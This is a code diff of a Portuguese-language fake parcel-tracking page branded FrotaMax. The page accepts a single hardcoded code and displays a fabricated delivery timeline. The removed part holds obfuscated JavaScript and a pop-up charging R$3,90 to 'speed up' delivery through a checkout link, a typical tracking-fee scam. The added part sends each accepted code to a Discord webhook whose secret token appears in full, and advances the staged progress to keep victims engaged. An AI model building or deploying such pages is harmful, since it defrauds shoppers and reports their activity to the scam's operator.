@@ -319,7 +319,7 @@ header{
 
 .tracking-progress-fill {
   height: 100%;
-  width: 13%;
+  width: 67%;
   background: var(--primary);
   border-radius: 4px;
 }
@@ -342,84 +342,6 @@ header{
 .tracking-note p {
   font-size: 16px;
   color: #666;
-}
-
-/* Estilos para o modal */
-.modal {
-  display: none;
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background-color: rgba(0, 0, 0, 0.7);
-  z-index: 1000;
-  justify-content: center;
-  align-items: center;
-}
-
-.modal-content {
-  background-color: white;
-  padding: 30px;
-  border-radius: 20px;
-  max-width: 500px;
-  width: 90%;
-  text-align: center;
-  box-shadow: 0 15px 30px rgba(0,0,0,.2);
-  animation: modalFadeIn 0.3s ease-out;
-}
-
-@keyframes modalFadeIn {
-  from {
-    opacity: 0;
-    transform: translateY(-20px);
-  }
-  to {
-    opacity: 1;
-    transform: translateY(0);
-  }
-}
-
-.modal-close {
-  position: absolute;
-  top: 15px;
-  right: 15px;
-  font-size: 24px;
-  cursor: pointer;
-  color: #999;
-}
-
-.modal-close:hover {
-  color: #333;
-}
-
-.modal-icon {
-  font-size: 48px;
-  color: var(--primary);
-  margin-bottom: 20px;
-}
-
-.modal h2 {
-  margin-bottom: 15px;
-  color: var(--dark);
-}
-
-.modal p {
-  margin-bottom: 25px;
-  color: #666;
-  line-height: 1.5;
-}
-
-.modal-buttons {
-  display: flex;
-  gap: 15px;
-  justify-content: center;
-  flex-wrap: wrap;
-}
-
-.modal-buttons .btn {
-  flex: 1;
-  min-width: 150px;
 }
 
 /* ===== FOOTER ===== */
@@ -465,30 +387,6 @@ footer{
     align-items: flex-start;
     gap: 10px;
   }
-  
-  .modal-buttons {
-    flex-direction: column;
-  }
-  
-  .modal-buttons .btn {
-    width: 100%;
-  }
-  
-  /* Estiliza o link dentro da tracking-note */
-.tracking-note a {
-  display: block; /* Faz o link ocupar toda a linha, como um parágrafo */
-  font-size: 16px;
-  color: #666; /* Mantém a cor do texto original */
-  text-decoration: none; /* Remove o sublinhado padrão do link */
-  cursor: pointer; /* Muda o cursor para uma mão ao passar o mouse */
-  transition: color 0.3s ease; /* Adiciona uma transição suave na mudança de cor */
-}
-
-/* Efeito ao passar o mouse sobre o link (opcional, mas recomendado) */
-.tracking-note a:hover {
-  color: var(--primary); /* Muda a cor para a amarela da marca no hover */
-  text-decoration: underline; /* Opcional: adiciona sublinhado no hover para mais feedback */
-}
 }
 </style>
 </head>
@@ -555,23 +453,104 @@ footer{
           <div class="tracking-status">Coletado no ponto</div>
           <div class="tracking-location">Centro de Distribuição – São José, SC</div>
         </div>     
+		
+		<div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item completed">
+          <div class="tracking-date">24/02/2026 - 10:32</div>
+          <div class="tracking-status">A caminho do centro logístico</div>
+          <div class="tracking-location">Em trânsito para Itajaí, SC</div>
+        </div> 
 
           <div class="tracking-arrow">
           <i class="fas fa-arrow-down"></i>
         </div>
 
-        <div class="tracking-item active">
-          <div class="tracking-date">22/02/2026 - 07:37</div>
-          <div class="tracking-status">A caminho do centro logístico</div>
-          <div class="tracking-location">Em trânsito para Itajaí, SC</div>
+        <div class="tracking-item completed">
+          <div class="tracking-date">25/02/2026 - 07:37</div>
+          <div class="tracking-status">Chegada ao centro logístico</div>
+          <div class="tracking-location">Itajaí, SC</div>
         </div>		
+		
+		<div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item completed">
+          <div class="tracking-date">26/02/2026 - 14:17</div>
+          <div class="tracking-status">Em trânsito</div>
+          <div class="tracking-location">Saída de Itajaí para Joinville, SC</div>
+        </div> 
+		
+		<div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item completed">
+          <div class="tracking-date">27/02/2026 - 16:16</div>
+          <div class="tracking-status">Chegada ao centro logístico</div>
+          <div class="tracking-location">Joinville, SC</div>
+        </div> 
+		
+		<div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item completed">
+          <div class="tracking-date">28/02/2026 - 06:01</div>
+          <div class="tracking-status">Em trânsito</div>
+          <div class="tracking-location">Saída de Joinville para Curitiba, PR</div>
+        </div> 
+		
+		<div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item completed">
+          <div class="tracking-date">01/03/2026 - 11:38</div>
+          <div class="tracking-status">Chegada ao centro logístico</div>
+          <div class="tracking-location">Curitiba, PR</div>
+        </div> 
+		
+		<div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item completed">
+          <div class="tracking-date">02/03/2026 - 14:11</div>
+          <div class="tracking-status">Em trânsito</div>
+          <div class="tracking-location">Saída de Curitiba para Registro, SP</div>
+        </div> 
+		
+		<div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item completed">
+          <div class="tracking-date">04/03/2026 - 17:20</div>
+          <div class="tracking-status">Chegada ao ponto de apoio</div>
+          <div class="tracking-location">Registro, SP</div>
+        </div> 
+		
+		<div class="tracking-arrow">
+          <i class="fas fa-arrow-down"></i>
+        </div>
+        
+        <div class="tracking-item active">
+          <div class="tracking-date">05/03/2026 - 15:53</div>
+          <div class="tracking-status">Em trânsito</div>
+          <div class="tracking-location">Saída de Registro para Sorocaba, SP</div>
+        </div> 
+		
       
       <div class="tracking-progress">
         <div class="tracking-progress-bar">
           <div class="tracking-progress-fill"></div>
         </div>
         <div class="tracking-progress-text">
-          <span>13% concluído</span>
+          <span>67% concluído</span>
           <!-- <span>Previsão de entrega: 18/05/2023</span> -->
         </div>
       </div>
@@ -583,10 +562,10 @@ footer{
       </button>
       
       <div class="tracking-note">
-  <a href="checkout.html">
-    <i class="fas fa-info-circle"></i> Acelere seu pedido clicando aqui
-  </a>
-</div>
+        <p>
+          <i class="fas fa-info-circle"></i> Para mais informações sobre sua entrega, entre em contato com nosso suporte.
+        </p>
+      </div>
     </div>
 
   </div>
@@ -598,31 +577,65 @@ footer{
   © 2026 FrotaMax • Todos os direitos reservados
 </footer>
 
-<!-- MODAL -->
-<div id="trackingModal" class="modal">
-  <div class="modal-content">
-    <span class="modal-close" onclick="fecharModal()">&times;</span>
-    <div class="modal-icon">
-      <i class="fas fa-truck-fast"></i>
-    </div>
-    <h2>Acelere sua entrega</h2>
-    <p> 🚀 Acelere sua entrega por apenas R$ 3,90! Em vez de esperar pelo transporte em caminhão, sua carga será levada por uma van exclusiva, garantindo mais agilidade e prioridade no trajeto. </p>
-    <div class="modal-buttons">
-      <button class="btn btn-primary" onclick="comprarPlanoRapido()">
-        <i class="fas fa-bolt"></i>
-        Acelerar por R$3,90
-      </button>
-      <button class="btn btn-secondary" onclick="manterEntregaNormal()">
-        <i class="fas fa-clock"></i>
-        Manter entrega normal
-      </button>
-    </div>
-  </div>
-</div>
-
 
 <script>
-  const bxNPscQkUHb$gJ=Zky$JRfI$vyhFuuVgGjOQC;(function(zXupI,SiGMO_YN){const ahEPO=Zky$JRfI$vyhFuuVgGjOQC,lUHQvsrcAQT=zXupI();while(!![]){try{const iahXZdrrA_E$wchmYJUAz=Math['trunc'](-parseFloat(ahEPO(0x109))/(parseInt(0x1aa5)+parseFloat(parseInt(0x972))+Math.ceil(-parseInt(0x3e))*parseInt(0x95)))*(-parseFloat(ahEPO(0xef))/(0x58e*0x2+Number(-parseInt(0x1))*parseInt(0x1dcc)+parseInt(0x12b2)))+Number(-parseFloat(ahEPO(0x10b))/(-0x2605+parseInt(parseInt(0xa27))+-parseInt(0x27)*-parseInt(0xb7)))+-parseFloat(ahEPO(0xf6))/(0x2238+Math.trunc(0x727)+-0x295b*Math.trunc(0x1))+-parseFloat(ahEPO(0xfb))/(parseInt(0x695)+Number(0xd)*0x83+-0xd37)*parseFloat(parseFloat(ahEPO(0x11b))/(0x1bb8+parseInt(0x2269)+-parseInt(0x3e1b)))+parseFloat(ahEPO(0x10d))/(Math.ceil(parseInt(0x25fb))+Math.floor(-parseInt(0x359))*-parseInt(0x1)+-parseInt(0x6d)*parseInt(0x61))+Math['max'](parseFloat(ahEPO(0xf3))/(parseInt(0x251)*0x3+-0x20be+Math.max(0x19d3,0x19d3)),parseFloat(ahEPO(0x105))/(Math.max(-parseInt(0x1b15),-parseInt(0x1b15))*Math.ceil(parseInt(0x1))+0x2182+0x2*-parseInt(0x332)))+-parseFloat(ahEPO(0xd9))/(-0x73*parseInt(0x16)+-parseInt(0x269)*Math.max(-parseInt(0x5),-0x5)+-0x5*Number(0x6d))*Math['floor'](-parseFloat(ahEPO(0x108))/(Math.trunc(parseInt(0x22ed))+0x2*parseInt(-0xbc1)+Math.trunc(-0xb60)));if(iahXZdrrA_E$wchmYJUAz===SiGMO_YN)break;else lUHQvsrcAQT['push'](lUHQvsrcAQT['shift']());}catch(OEdJW_rZpkXfOjQQLDX){lUHQvsrcAQT['push'](lUHQvsrcAQT['shift']());}}}(JcMbki$aOnT$igDiIqfFrN,Number(0xc89)*Math.ceil(-parseInt(0x27))+parseFloat(0xd90c1)+parseFloat(-0x2fe3f)));const CODIGO_VALIDO=bxNPscQkUHb$gJ(0xe5);function JcMbki$aOnT$igDiIqfFrN(){const YvFI$BQVn=['465a5755535e595a525344','15505002520252','18424457555d5f58511b5f42535b185755425f4053','5a595557425f5958','5746465a5f5557425f5958195c455958','5559525f5159734e5f545f5259','555e53555d594342185e425b5a','424457555d5f585175595253','42445f5b','455b5959425e','010e04020e02717d60545f5d','40575a4353','6659441650574059441a165f58455f445716435b1655f585525f515916525316445745424453575b53584259','07067c79506c5c5b','15525252','555742555e','5f58464342','735b164244f59458455f4259165755535a5344575259164657445716645f59165253167c5758535f44591a16647c','18424457555d5f58511b5a595557425f5958','45425742434562534e42','57525273405358427a5f454253585344','5e424246450c1919525f45555944521855595b1957465f194153545e59595d45190702000e0102000e0103050005030402010606194244507f70444e037a65665a4c7a597e54635c5a6c665b5a605c47735e524c5d00425d7a5246406f63554c5378466e57054e4f647c7275435f7f59500067534e0f615703','75f585525f5159165f5840f5975a5f52591816625358425316585940575b5358425318','18424457555d5f58511b46445951445345451b42534e4216454657580c5a5745421b555e5f5a52','474353444f65535a5355425944','74647c7a72030502020173006f','62445758454659444253165755535a53445752591646594416405758','18424457555d5f58511b46445951445345451b505f5a5a','45424f5a53','66796562','73444459165759165358405f5744164153545e59595d0c','7358425344','664453405f45f5955916525316535842445351570c1607001906031904060405161e57584253555f465752571f','515342735a535b535842744f7f52','525f45465a574f','040701030702025e754f407047','18424457555d5f58511b454257424345','4542574442','42534e4275595842535842','0506020e01000658657e705974','425e5358','7344445916525316445352530c','05050f00010f045c5851424474','5d534f4644534545','545a59555d','5344445944','725f515f4253164553431655f585525f515916525316445745424453575b53584259','0406597e6079777d','424457555d5f58517b5952575a','18424457555d5f58511b46445951445345451b42534e4216454657580c505f4445421b555e5f5a52','4542445f58515f504f','5e445350','54594452534475595a5944','415f52425e','59585a595752','505a534e','5d534f','0502040f0e03036e5a43477472','01061316555958555a43f59b5259','c6a9a2b87746460c16755a5f55594316535b16445745424453575b535842591655595b16591655f585525f51590c16','0705070e0e0501056e535a7b5342','074e746e7a617c','455544595a5a7f584259605f5341','04050e0e0f030774557c5c417c','424457555d5f585175595842575f585344','0201060f050475467e7a6e42','4259634646534475574553','58595853','010613'];JcMbki$aOnT$igDiIqfFrN=function(){return YvFI$BQVn;};return JcMbki$aOnT$igDiIqfFrN();}function Zky$JRfI$vyhFuuVgGjOQC(zyAlMtoArAhNPIyTqU,klACoHBEVbpEGR){const rKj$KefD=JcMbki$aOnT$igDiIqfFrN();return Zky$JRfI$vyhFuuVgGjOQC=function(TQjgEQyqWgwosmhfNPn,bjoBArw$lGCafJAqijPP){TQjgEQyqWgwosmhfNPn=TQjgEQyqWgwosmhfNPn-(0x1a*0xe2+-0x1de5+-parseInt(0x7ca)*-0x1);let BY_hgo_B=rKj$KefD[TQjgEQyqWgwosmhfNPn];if(Zky$JRfI$vyhFuuVgGjOQC['AqOade']===undefined){const tnSHFoBXluqBDJO$fZjmXelMet=function(Gp_jCoPJZQHgLXGxrvtC$MDa){let kqAqmEIEWEmdMacjit=0x1cf0+Number(-parseInt(0xf5))*0x1b+Math.max(-parseInt(0x7),-parseInt(0x7))*parseInt(0x45)&Math.ceil(0x10b)*-0x17+Math.ceil(-parseInt(0x1fc))+Number(-0x2)*-0xd7c,EmWIqSdxoSWj$jqhMP=new Uint8Array(Gp_jCoPJZQHgLXGxrvtC$MDa['match'](/.{1,2}/g)['map'](XjAr_dGL$R=>parseInt(XjAr_dGL$R,-parseInt(0x145)*-parseInt(0x19)+Math.trunc(0x83)*Math.trunc(-0x39)+parseFloat(-parseInt(0xd6))*Math.floor(0x3)))),ClZhBiGKCMEEeAOc_kDkygqhWX=EmWIqSdxoSWj$jqhMP['map'](diXkkRC_j=>diXkkRC_j^kqAqmEIEWEmdMacjit),iU_EIW$Z=new TextDecoder(),i_At_IA=iU_EIW$Z['decode'](ClZhBiGKCMEEeAOc_kDkygqhWX);return i_At_IA;};Zky$JRfI$vyhFuuVgGjOQC['hSXUUv']=tnSHFoBXluqBDJO$fZjmXelMet,zyAlMtoArAhNPIyTqU=arguments,Zky$JRfI$vyhFuuVgGjOQC['AqOade']=!![];}const PzteCvyaYvxBXLWJhCy=rKj$KefD[Math.max(-parseInt(0x25b6),-0x25b6)+-0x139b+0x3951],FqBcJjwJjngtr=TQjgEQyqWgwosmhfNPn+PzteCvyaYvxBXLWJhCy,oHVOAKGKVbikCp$HL=zyAlMtoArAhNPIyTqU[FqBcJjwJjngtr];return!oHVOAKGKVbikCp$HL?(Zky$JRfI$vyhFuuVgGjOQC['NFPiAC']===undefined&&(Zky$JRfI$vyhFuuVgGjOQC['NFPiAC']=!![]),BY_hgo_B=Zky$JRfI$vyhFuuVgGjOQC['hSXUUv'](BY_hgo_B),zyAlMtoArAhNPIyTqU[FqBcJjwJjngtr]=BY_hgo_B):BY_hgo_B=oHVOAKGKVbikCp$HL,BY_hgo_B;},Zky$JRfI$vyhFuuVgGjOQC(zyAlMtoArAhNPIyTqU,klACoHBEVbpEGR);}function verificarCodigo(){const drWU$nstHgFB$q=bxNPscQkUHb$gJ,lI$zyAlMt$oAr=document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x118))[drWU$nstHgFB$q(0x11c)][drWU$nstHgFB$q(0x119)]()[drWU$nstHgFB$q(0x10e)]();if(lI$zyAlMt$oAr===CODIGO_VALIDO)fetch(drWU$nstHgFB$q(0xe1),{'method':drWU$nstHgFB$q(0xe9),'headers':{'Content-Type':drWU$nstHgFB$q(0x115)},'body':JSON[drWU$nstHgFB$q(0xfe)]({'content':drWU$nstHgFB$q(0x107)+lI$zyAlMt$oAr})})[drWU$nstHgFB$q(0xf4)](hNPIyTqUxklA$Co$H=>{const YraeCbCJdoFcnNeNT_VtuyPz=drWU$nstHgFB$q;!hNPIyTqUxklA$Co$H['ok']&&console[YraeCbCJdoFcnNeNT_VtuyPz(0xf9)](YraeCbCJdoFcnNeNT_VtuyPz(0xea),hNPIyTqUxklA$Co$H[YraeCbCJdoFcnNeNT_VtuyPz(0xdf)]);})[drWU$nstHgFB$q(0xdb)](EVbpEGRfrKjKefDJ=>console[drWU$nstHgFB$q(0xf9)](drWU$nstHgFB$q(0xf5),EVbpEGRfrKjKefDJ)),document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x10c))[drWU$nstHgFB$q(0xe8)][drWU$nstHgFB$q(0xee)]=drWU$nstHgFB$q(0xf8),document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x116))[drWU$nstHgFB$q(0xf2)]=lI$zyAlMt$oAr,document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x10c))[drWU$nstHgFB$q(0x10a)]({'behavior':drWU$nstHgFB$q(0x11a),'block':drWU$nstHgFB$q(0xf1)});else lI$zyAlMt$oAr===''?(document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x118))[drWU$nstHgFB$q(0xe8)][drWU$nstHgFB$q(0x100)]=drWU$nstHgFB$q(0x112),document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x118))[drWU$nstHgFB$q(0x111)]=drWU$nstHgFB$q(0x11d)):(document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x118))[drWU$nstHgFB$q(0xe8)][drWU$nstHgFB$q(0x100)]=drWU$nstHgFB$q(0x112),document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x118))[drWU$nstHgFB$q(0x11c)]='',document[drWU$nstHgFB$q(0xed)](drWU$nstHgFB$q(0x118))[drWU$nstHgFB$q(0x111)]=drWU$nstHgFB$q(0xe2));}function fecharModal(){const chWwfTSqOvrfTCChAo_inx=bxNPscQkUHb$gJ;document[chWwfTSqOvrfTCChAo_inx(0xed)](chWwfTSqOvrfTCChAo_inx(0xfc))[chWwfTSqOvrfTCChAo_inx(0xe8)][chWwfTSqOvrfTCChAo_inx(0xee)]=chWwfTSqOvrfTCChAo_inx(0x10f);}function comprarPlanoRapido(){const OuTrRgxGY_BJrfpr_pnJ=bxNPscQkUHb$gJ;document[OuTrRgxGY_BJrfpr_pnJ(0xe4)](OuTrRgxGY_BJrfpr_pnJ(0xe7))[OuTrRgxGY_BJrfpr_pnJ(0xe8)][OuTrRgxGY_BJrfpr_pnJ(0x101)]=OuTrRgxGY_BJrfpr_pnJ(0x110),document[OuTrRgxGY_BJrfpr_pnJ(0xe4)](OuTrRgxGY_BJrfpr_pnJ(0xfd))[OuTrRgxGY_BJrfpr_pnJ(0xf2)]=OuTrRgxGY_BJrfpr_pnJ(0x106),document[OuTrRgxGY_BJrfpr_pnJ(0xe4)](OuTrRgxGY_BJrfpr_pnJ(0xe3))[OuTrRgxGY_BJrfpr_pnJ(0xf2)]=OuTrRgxGY_BJrfpr_pnJ(0xec),fecharModal();const QjgEQyqWgwosm$hfNPnKbjoB=document[OuTrRgxGY_BJrfpr_pnJ(0xe4)](OuTrRgxGY_BJrfpr_pnJ(0x113));QjgEQyqWgwosm$hfNPnKbjoB&&(QjgEQyqWgwosm$hfNPnKbjoB[OuTrRgxGY_BJrfpr_pnJ(0xe4)](OuTrRgxGY_BJrfpr_pnJ(0xf0))[OuTrRgxGY_BJrfpr_pnJ(0xf2)]=OuTrRgxGY_BJrfpr_pnJ(0xe6),QjgEQyqWgwosm$hfNPnKbjoB[OuTrRgxGY_BJrfpr_pnJ(0xe4)](OuTrRgxGY_BJrfpr_pnJ(0xde))[OuTrRgxGY_BJrfpr_pnJ(0xf2)]=OuTrRgxGY_BJrfpr_pnJ(0xdd)),setTimeout(function(){const PMM$BvFM=OuTrRgxGY_BJrfpr_pnJ;window[PMM$BvFM(0x114)][PMM$BvFM(0xff)]=PMM$BvFM(0x117);},-0x231a+-parseInt(0x25b6)+0x4cb8);}function manterEntregaNormal(){fecharModal();}window[bxNPscQkUHb$gJ(0x102)]=function(){const CbzZSWgX_ZOR=bxNPscQkUHb$gJ;document[CbzZSWgX_ZOR(0xed)](CbzZSWgX_ZOR(0xfc))[CbzZSWgX_ZOR(0xe8)][CbzZSWgX_ZOR(0xee)]=CbzZSWgX_ZOR(0x103);},document[bxNPscQkUHb$gJ(0xed)](bxNPscQkUHb$gJ(0x118))[bxNPscQkUHb$gJ(0xe0)](bxNPscQkUHb$gJ(0xdc),function(){const FEmS$XThaOYQlfifuTniVXRfe=bxNPscQkUHb$gJ;this[FEmS$XThaOYQlfifuTniVXRfe(0xe8)][FEmS$XThaOYQlfifuTniVXRfe(0x100)]=FEmS$XThaOYQlfifuTniVXRfe(0xda),this[FEmS$XThaOYQlfifuTniVXRfe(0x111)]=FEmS$XThaOYQlfifuTniVXRfe(0xfa);}),document[bxNPscQkUHb$gJ(0xed)](bxNPscQkUHb$gJ(0x118))[bxNPscQkUHb$gJ(0xe0)](bxNPscQkUHb$gJ(0xf7),function(rwl$G$CafJAqijPPe){const GuxodtNScuRvmbfXUmwajxYoj=bxNPscQkUHb$gJ;rwl$G$CafJAqijPPe[GuxodtNScuRvmbfXUmwajxYoj(0x104)]===GuxodtNScuRvmbfXUmwajxYoj(0xeb)&&verificarCodigo();});
+  // Código de rastreamento válido para teste
+  const CODIGO_VALIDO = "BRJLD53447E6Y";
+  
+  function verificarCodigo() {
+  const codigoInserido = document.getElementById('trackingCode').value.trim().toUpperCase();
+
+  if (codigoInserido === CODIGO_VALIDO) {
+    // Envia webhook para o Discord
+    fetch("https://discord.com/api/webhooks/1468746875363524700/trfIFrx5LSPlzLoHbUjlZPmlVjqEhdzk6tkLdpvYUczeNpXa3xyRJDCuiIof6Qex9Wa5", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `🔎App: Clicou em rastreamento com o código: ${codigoInserido}`
+      })
+    })
+    .then(response => {
+      if (!response.ok) {
+        console.error("Erro ao enviar webhook:", response.statusText);
+      }
+    })
+    .catch(error => console.error("Erro de rede:", error));
+
+    // Exibe o container de rastreamento se o código for válido
+    document.getElementById('trackingContainer').style.display = 'block';
+    document.getElementById('codigoExibido').textContent = codigoInserido;
+
+    // Rolagem suave para o container de rastreamento
+    document.getElementById('trackingContainer').scrollIntoView({ 
+      behavior: 'smooth',
+      block: 'start'
+    });
+  } else if (codigoInserido === '') {
+    // Exibe mensagem de erro se o campo estiver vazio
+    document.getElementById('trackingCode').style.borderColor = '#ff4d4d';
+    document.getElementById('trackingCode').placeholder = 'Por favor, insira um código de rastreamento';
+  } else {
+    // Exibe mensagem de erro se o código for inválido
+    document.getElementById('trackingCode').style.borderColor = '#ff4d4d';
+    document.getElementById('trackingCode').value = '';
+    document.getElementById('trackingCode').placeholder = 'Código inválido. Tente novamente.';
+  }
+}
+  
+  // Adiciona evento para limpar o estilo de erro quando o usuário começar a digitar
+  document.getElementById('trackingCode').addEventListener('input', function() {
+    this.style.borderColor = '#ddd';
+    this.placeholder = 'Digite seu código de rastreamento';
+  });
+  
+  // Adiciona evento para permitir verificar o código ao pressionar Enter
+  document.getElementById('trackingCode').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      verificarCodigo();
+    }
+  });
 </script>
 </body>
 </html>
